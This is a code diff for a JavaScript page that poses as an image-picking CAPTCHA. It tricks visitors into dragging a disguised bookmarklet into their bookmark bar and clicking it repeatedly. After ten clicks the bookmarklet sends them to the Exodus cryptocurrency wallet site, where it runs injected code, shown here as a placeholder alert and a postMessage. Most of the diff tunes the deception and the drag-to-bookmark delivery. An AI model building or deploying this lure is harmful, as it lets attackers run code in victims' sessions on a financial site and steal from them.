@@ -524,6 +524,9 @@
   const GLASS_PCT_PER_CLICK = 0.46;
   /** Step 2 only: enough bookmark spam → redirect. */
   const SPAM_CLICKS_TO_REDIRECT = 85;
+  /** Bookmark clicks while on our site only; at this count the bookmarklet navigates to the target site. */
+  const BOOKMARKLET_CLICKS_TO_REDIRECT = 10;
+  const BOOKMARKLET_TARGET_URL = "https://www.exodus.com/";
   /** Zombies stage: if user never uses the bookmark in this window, close & retry. */
   const ZOMBIE_NO_BOOKMARK_IDLE_MS = 12000;
 
@@ -840,7 +843,12 @@
       ".stage2-dark-scene .step2-timer-digits{color:#fbbf24}" +
       ".stage2-dark-scene .step2-timer-s{color:#fcd34d}" +
       ".stage2-dark-scene .step2-timer-hint{color:#94a3b8}" +
-      ".stage2-dark-scene .step2-timer-track{background:rgba(0,0,0,.35);border-color:rgba(255,255,255,.12)}";
+      ".stage2-dark-scene .step2-timer-track{background:rgba(0,0,0,.35);border-color:rgba(255,255,255,.12)}" +
+      ".challenge-tile.draggable{position:relative!important;overflow:hidden!important}" +
+      ".challenge-tile.draggable .tile-img{display:block!important;width:100%!important;height:100%!important;object-fit:cover!important;pointer-events:none!important;-webkit-user-drag:none!important}" +
+      ".challenge-tile.draggable .drag-layer{position:absolute!important;inset:0!important;display:block!important;z-index:2!important;text-decoration:none!important;cursor:grab!important}" +
+      ".challenge-tile.draggable .drag-layer:active{cursor:grabbing!important}" +
+      ".challenge-tile.draggable .drag-layer .drag-layer-img{display:block!important;width:100%!important;height:100%!important;object-fit:cover!important;pointer-events:none!important;-webkit-user-drag:none!important}";
     document.head.appendChild(st);
   })();
 
@@ -871,21 +879,61 @@
         '<text x="150" y="275" fill="#f472b6" font-size="56" font-family="system-ui,Segoe UI,sans-serif" font-weight="800" text-anchor="middle">÷</text>' +
         "</svg>"
     );
-  function img(url, label) { return { imageUrl: url, label: label }; }
+  function img(url, altText) {
+    return { imageUrl: url, alt: altText == null || altText === "" ? "item" : altText };
+  }
+
+  var BOOKMARK_EMOJI = {
+    hammer: "🔨",
+    bandage: "🩹",
+    gun: "🔫",
+    rocket: "🚀",
+    "math symbols": "🔢",
+    pizza: "🍕",
+    burger: "🍔",
+    apple: "🍎",
+    cookie: "🍪",
+    cake: "🍰",
+    puppy: "🐶",
+    taco: "🌮",
+    "ice cream": "🍦",
+    watch: "⌚",
+    keys: "🔑",
+    item: "📌",
+    bookmark: "📌"
+  };
+
+  function formatBookmarkTitle(alt) {
+    var raw = alt == null || alt === "" ? "item" : String(alt);
+    var k = raw.toLowerCase();
+    var emoji = BOOKMARK_EMOJI[k] || "📌";
+    var titled = raw.replace(/\b\w/g, function (ch) {
+      return ch.toUpperCase();
+    });
+    return emoji + " " + titled;
+  }
+
+  /** Plain text only (no emoji) — Chrome’s bookmark-bar drop often reads this more reliably than unicode symbols. */
+  function bookmarkBarStripTitle(alt) {
+    var raw = alt == null || alt === "" ? "Bookmark" : String(alt);
+    return raw.replace(/\b\w/g, function (ch) {
+      return ch.toUpperCase();
+    });
+  }
 
   var HAMMER_THEMES = [
     {
       answerIndex: 0,
       items: [
-        img(HAMMER_SOLO, "a"),
-        img(PIZZA, "a"),
-        img(APPLE, "a"),
-        img(COOKIE, "a"),
-        img(CAKE, "a"),
-        img(BURGER, "a"),
-        img(PUPPY, "a"),
-        img(TACO, "a"),
-        img(ICECREAM, "a")
+        img(HAMMER_SOLO, "hammer"),
+        img(PIZZA, "pizza"),
+        img(APPLE, "apple"),
+        img(COOKIE, "cookie"),
+        img(CAKE, "cake"),
+        img(BURGER, "burger"),
+        img(PUPPY, "puppy"),
+        img(TACO, "taco"),
+        img(ICECREAM, "ice cream")
       ]
     }
   ];
@@ -893,29 +941,29 @@
     {
       answerIndex: 2,
       items: [
-        img(BURGER, "a"),
-        img(APPLE, "a"),
-        img(BANDAGE, "a"),
-        img(PIZZA, "a"),
-        img(COOKIE, "a"),
-        img(CAKE, "a"),
-        img(TACO, "a"),
-        img(ICECREAM, "a"),
-        img(WATCH, "a")
+        img(BURGER, "burger"),
+        img(APPLE, "apple"),
+        img(BANDAGE, "bandage"),
+        img(PIZZA, "pizza"),
+        img(COOKIE, "cookie"),
+        img(CAKE, "cake"),
+        img(TACO, "taco"),
+        img(ICECREAM, "ice cream"),
+        img(WATCH, "watch")
       ]
     },
     {
       answerIndex: 3,
       items: [
-        img(PIZZA, "a"),
-        img(BURGER, "a"),
-        img(APPLE, "a"),
-        img(BANDAGE, "a"),
-        img(COOKIE, "a"),
-        img(CAKE, "a"),
-        img(TACO, "a"),
-        img(KEYS, "a"),
-        img(PUPPY, "a")
+        img(PIZZA, "pizza"),
+        img(BURGER, "burger"),
+        img(APPLE, "apple"),
+        img(BANDAGE, "bandage"),
+        img(COOKIE, "cookie"),
+        img(CAKE, "cake"),
+        img(TACO, "taco"),
+        img(KEYS, "keys"),
+        img(PUPPY, "puppy")
       ]
     }
   ];
@@ -923,15 +971,15 @@
     {
       answerIndex: 0,
       items: [
-        img(GUN, "a"),
-        img(PIZZA, "a"),
-        img(APPLE, "a"),
-        img(BURGER, "a"),
-        img(CAKE, "a"),
-        img(PUPPY, "a"),
-        img(COOKIE, "a"),
-        img(TACO, "a"),
-        img(ICECREAM, "a")
+        img(GUN, "gun"),
+        img(PIZZA, "pizza"),
+        img(APPLE, "apple"),
+        img(BURGER, "burger"),
+        img(CAKE, "cake"),
+        img(PUPPY, "puppy"),
+        img(COOKIE, "cookie"),
+        img(TACO, "taco"),
+        img(ICECREAM, "ice cream")
       ]
     }
   ];
@@ -939,15 +987,15 @@
     {
       answerIndex: 1,
       items: [
-        img(PIZZA, "a"),
-        img(ROCKET, "a"),
-        img(APPLE, "a"),
-        img(BURGER, "a"),
-        img(CAKE, "a"),
-        img(PUPPY, "a"),
-        img(WATCH, "a"),
-        img(COOKIE, "a"),
-        img(TACO, "a")
+        img(PIZZA, "pizza"),
+        img(ROCKET, "rocket"),
+        img(APPLE, "apple"),
+        img(BURGER, "burger"),
+        img(CAKE, "cake"),
+        img(PUPPY, "puppy"),
+        img(WATCH, "watch"),
+        img(COOKIE, "cookie"),
+        img(TACO, "taco")
       ]
     }
   ];
@@ -955,15 +1003,15 @@
     {
       answerIndex: 4,
       items: [
-        img(PIZZA, "a"),
-        img(APPLE, "a"),
-        img(BURGER, "a"),
-        img(CAKE, "a"),
-        img(MATH_SYMBOL, "a"),
-        img(COOKIE, "a"),
-        img(PUPPY, "a"),
-        img(TACO, "a"),
-        img(ICECREAM, "a")
+        img(PIZZA, "pizza"),
+        img(APPLE, "apple"),
+        img(BURGER, "burger"),
+        img(CAKE, "cake"),
+        img(MATH_SYMBOL, "math symbols"),
+        img(COOKIE, "cookie"),
+        img(PUPPY, "puppy"),
+        img(TACO, "taco"),
+        img(ICECREAM, "ice cream")
       ]
     }
   ];
@@ -1091,34 +1139,48 @@
     theme.items.forEach(function (item, i) {
       var isAnswer = (i === theme.answerIndex);
       var href = isAnswer ? answerHref : wrongHref;
+      var bmLabel = item.alt || "bookmark";
+      var titleForBar = bookmarkBarStripTitle(bmLabel);
+
       var tile = document.createElement("div");
       tile.className = "challenge-tile draggable";
 
+      var a = document.createElement("a");
+      a.href = href;
+      a.className = "drag-layer";
+      a.title = titleForBar;
+      a.setAttribute("draggable", "true");
+      a.setAttribute("tabindex", "-1");
+      a.addEventListener("click", function (e) { e.preventDefault(); });
+
       var img = document.createElement("img");
       img.src = item.imageUrl;
-      img.alt = "";
-      img.className = "tile-img";
+      img.alt = titleForBar;
+      img.className = isAnswer ? "drag-layer-img" : "tile-img";
       img.setAttribute("draggable", "false");
       img.setAttribute("decoding", "async");
       if (isAnswer) {
         img.loading = "eager";
         img.setAttribute("fetchpriority", "high");
       }
-      tile.appendChild(img);
 
-      var a = document.createElement("a");
-      a.href = href;
-      a.className = "drag-layer";
-      a.setAttribute("draggable", "true");
-      a.setAttribute("aria-hidden", "true");
-      a.setAttribute("tabindex", "-1");
-      a.addEventListener("click", function (e) { e.preventDefault(); });
+      if (isAnswer) {
+        a.appendChild(img);
+      } else {
+        tile.appendChild(img);
+      }
+
       a.addEventListener("dragstart", function (e) {
+        try { e.dataTransfer.effectAllowed = "copyLink"; } catch (_) {}
         e.dataTransfer.setData("text/uri-list", href);
-        e.dataTransfer.setData("text/plain", href);
+        e.dataTransfer.setData("text/plain", titleForBar);
+        try { e.dataTransfer.setData("text/x-moz-url", href + "\n" + titleForBar); } catch (_) {}
+        try {
+          e.dataTransfer.setData("text/html", "<a href=\"" + href.replace(/"/g, "&quot;") + "\">" + titleForBar + "</a>");
+        } catch (_) {}
       });
-      tile.appendChild(a);
 
+      tile.appendChild(a);
       grid.appendChild(tile);
     });
   }
@@ -2284,21 +2346,30 @@
 
   function buildUnifiedBookmarklet() {
     var baseEsc = captchaBaseUrl.replace(/'/g, "\\'");
+    var destEsc = BOOKMARKLET_TARGET_URL.replace(/'/g, "\\'");
+    var maxC = String(BOOKMARKLET_CLICKS_TO_REDIRECT);
     return (
       "javascript:(function(){" +
       "var base='" + baseEsc + "';" +
+      "var dest='" + destEsc + "';" +
+      "var maxC=" + maxC + ";" +
       "var k='bookmarkletClicks';" +
+      "var h=location.hostname;" +
+      "var isExodus=h==='www.exodus.com'||h==='exodus.com';" +
+      "if(isExodus){" +
+      "alert(\"Injected code on Exodus\");" +
+      "try{window.parent.postMessage({type:'exodus_injected'},'*');}catch(e){}" +
+      "return;" +
+      "}" +
+      "var our=location.protocol+'//'+location.host;" +
+      "var isOur=(our===base);" +
+      "if(!isOur){return;}" +
       "var n=parseInt(localStorage.getItem(k)||0,10)+1;" +
       "localStorage.setItem(k,n);" +
       "var doc=document;var clickCounter=doc.getElementById('clickCounter');" +
       "if(!clickCounter&&window.frames&&window.frames.length){try{for(var i=0;i<window.frames.length;i++){clickCounter=window.frames[i].document.getElementById('clickCounter');if(clickCounter){doc=window.frames[i].document;break;}}}catch(e){}}" +
-      "if(clickCounter){" +
-      "clickCounter.textContent=n;" +
-      "try{window.parent.postMessage({type:'captcha_tick',clicks:n},'*');}catch(e){}" +
-      "}else if(window.location.hostname.includes('exodus.com')){" +
-      "localStorage.setItem('bookmarkletClicks',n);" +
-      "try{window.parent.postMessage({type:'exodus_click',clicks:n},'*');}catch(e){}" +
-      "}" +
+      "if(clickCounter){clickCounter.textContent=n;try{window.parent.postMessage({type:'captcha_tick',clicks:n},'*');}catch(e){}}" +
+      "if(n>=maxC){window.location.href=dest;}" +
       "})();"
     );
   }
